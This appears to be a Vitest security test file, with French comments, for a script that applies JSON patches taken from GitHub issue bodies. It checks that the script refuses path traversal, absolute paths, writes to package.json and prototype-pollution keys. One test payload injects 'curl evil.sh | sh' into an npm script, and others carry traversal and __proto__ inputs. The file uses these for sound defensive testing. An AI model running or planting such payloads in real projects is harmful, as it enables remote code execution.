import { describe, it, expect, beforeEach, afterAll } from 'vitest'
import { execFileSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

/**
 * Tests de non-regression de securite.
 *
 * Le corps d'une issue GitHub est une donnee non fiable : n'importe qui peut
 * ouvrir une issue « [Contribution] » et declencher le workflow, qui dispose
 * d'un token en ecriture sur le depot. Le script ne doit ecrire QUE dans des
 * fichiers .jsonc de src/data/.
 *
 * Le script est execute tel quel, en sous-processus, dans un bac a sable :
 * c'est le vrai point d'entree du workflow qui est teste.
 */

const SCRIPT = path.resolve('scripts/apply-contribution-patch.mjs')
const FENCE = '`'.repeat(3)

let sandbox

function makeSandbox() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bddfr-patch-'))
  fs.mkdirSync(path.join(dir, 'src/data/armes'), { recursive: true })
  fs.writeFileSync(
    path.join(dir, 'src/data/armes/armes.jsonc'),
    '{\n  // commentaire a preserver\n  "famas": { "nom": "FAMAS" }\n}\n'
  )
  fs.writeFileSync(
    path.join(dir, 'package.json'),
    JSON.stringify({ name: 'cible', scripts: { validate: 'echo ok' } }, null, 2)
  )
  fs.mkdirSync(path.join(dir, 'scripts/validate'), { recursive: true })
  fs.writeFileSync(path.join(dir, 'scripts/validate/validate-schemas.mjs'), '// legitime\n')
  return dir
}

/** Lance le script avec le corps d'issue donne. Retourne {code, stderr}. */
function run(issueBody) {
  try {
    execFileSync(process.execPath, [SCRIPT], {
      cwd: sandbox,
      env: { ...process.env, ISSUE_BODY: issueBody },
      encoding: 'utf8',
      stdio: 'pipe',
    })
    return { code: 0, stderr: '' }
  } catch (e) {
    return { code: e.status ?? 1, stderr: String(e.stderr ?? '') }
  }
}

/** Enrobe du JSON brut dans un bloc de code markdown, comme dans une issue. */
const rawPayload = (jsonText) => [FENCE + 'json', jsonText, FENCE].join('\n')
const payload = (patches) => rawPayload(JSON.stringify(patches))
const read = (rel) => fs.readFileSync(path.join(sandbox, rel), 'utf8')

beforeEach(() => { sandbox = makeSandbox() })
afterAll(() => { try { fs.rmSync(sandbox, { recursive: true, force: true }) } catch { /* best effort */ } })

describe('rejet des chemins hors src/data/', () => {
  it('refuse d ecrire dans package.json (RCE via les scripts npm)', () => {
    const before = read('package.json')
    const { code, stderr } = run(payload([
      { path: 'package.json', upserts: { scripts: { validate: 'curl evil.sh | sh' } } },
    ]))

    expect(code).toBe(1)
    expect(stderr).toMatch(/Chemin non autorise/)
    expect(read('package.json')).toBe(before)
  })

  it('refuse la traversee de repertoire', () => {
    const before = read('package.json')
    const { code } = run(payload([
      { path: 'src/data/../../package.json', upserts: { scripts: { a: 'b' } } },
    ]))

    expect(code).toBe(1)
    expect(read('package.json')).toBe(before)
  })

  it('refuse d ecrire dans un script de validation', () => {
    const before = read('scripts/validate/validate-schemas.mjs')
    const { code } = run(payload([
      { path: 'scripts/validate/validate-schemas.mjs', upserts: { x: {} } },
    ]))

    expect(code).toBe(1)
    expect(read('scripts/validate/validate-schemas.mjs')).toBe(before)
  })

  it('refuse un chemin absolu', () => {
    const before = read('package.json')
    const { code } = run(payload([
      { path: path.join(sandbox, 'package.json'), upserts: { scripts: { a: 'b' } } },
    ]))

    expect(code).toBe(1)
    expect(read('package.json')).toBe(before)
  })

  it('refuse un path qui n est pas une chaine', () => {
    expect(run(payload([{ path: 42, upserts: {} }])).code).toBe(1)
    expect(run(payload([{ path: null, upserts: {} }])).code).toBe(1)
  })
})

describe('validation du contenu', () => {
  it('refuse un slug non conforme', () => {
    const { code, stderr } = run(payload([
      { path: 'src/data/armes/armes.jsonc', upserts: { '../../evil': { nom: 'x' } } },
    ]))

    expect(code).toBe(1)
    expect(stderr).toMatch(/Slug invalide/)
  })

  it('refuse une cle __proto__ (prototype pollution)', () => {
    // En litteral JS, `__proto__:` definit le prototype et JSON.stringify
    // l'elimine : la charge n'atteindrait jamais le script. JSON.parse, lui,
    // cree bien une propriete propre "__proto__" — d'ou le JSON brut ici.
    const { code, stderr } = run(rawPayload(
      '[{"path":"src/data/armes/armes.jsonc","upserts":{"arme_x":{"__proto__":{"pwn":1}}}}]'
    ))

    expect(code).toBe(1)
    expect(stderr).toMatch(/Cle interdite/)
  })

  it('refuse une cle constructor', () => {
    const { code } = run(rawPayload(
      '[{"path":"src/data/armes/armes.jsonc","upserts":{"arme_x":{"constructor":{"pwn":1}}}}]'
    ))

    expect(code).toBe(1)
  })

  it('refuse un upsert qui n est pas un objet', () => {
    expect(run(payload([
      { path: 'src/data/armes/armes.jsonc', upserts: { arme_x: 'chaine' } },
    ])).code).toBe(1)
  })

  it('refuse un patch qui n est pas un tableau', () => {
    expect(run(payload({ path: 'src/data/armes/armes.jsonc', upserts: {} })).code).toBe(1)
  })

  it('refuse un nombre de patches abusif', () => {
    const many = Array.from({ length: 51 }, () => ({
      path: 'src/data/armes/armes.jsonc', upserts: {},
    }))
    const { code, stderr } = run(payload(many))

    expect(code).toBe(1)
    expect(stderr).toMatch(/Trop de patches/)
  })
})

describe('contributions legitimes', () => {
  it('ajoute une cle et preserve les commentaires', () => {
    const { code } = run(payload([
      { path: 'src/data/armes/armes.jsonc', upserts: { p416: { nom: 'P416', degats: 10 } } },
    ]))

    expect(code).toBe(0)
    const content = read('src/data/armes/armes.jsonc')
    expect(content).toContain('// commentaire a preserver')
    expect(JSON.parse(content.replace(/^\s*\/\/.*$/gm, '')).p416.nom).toBe('P416')
  })

  it('met a jour une cle existante', () => {
    run(payload([
      { path: 'src/data/armes/armes.jsonc', upserts: { famas: { nom: 'FAMAS 5.56' } } },
    ]))

    expect(read('src/data/armes/armes.jsonc')).toContain('FAMAS 5.56')
  })

  it('ne fait rien et sort en succes sans bloc json', () => {
    const before = read('src/data/armes/armes.jsonc')
    const { code } = run('Bonjour, ceci est une issue normale sans patch.')

    expect(code).toBe(0)
    expect(read('src/data/armes/armes.jsonc')).toBe(before)
  })
})
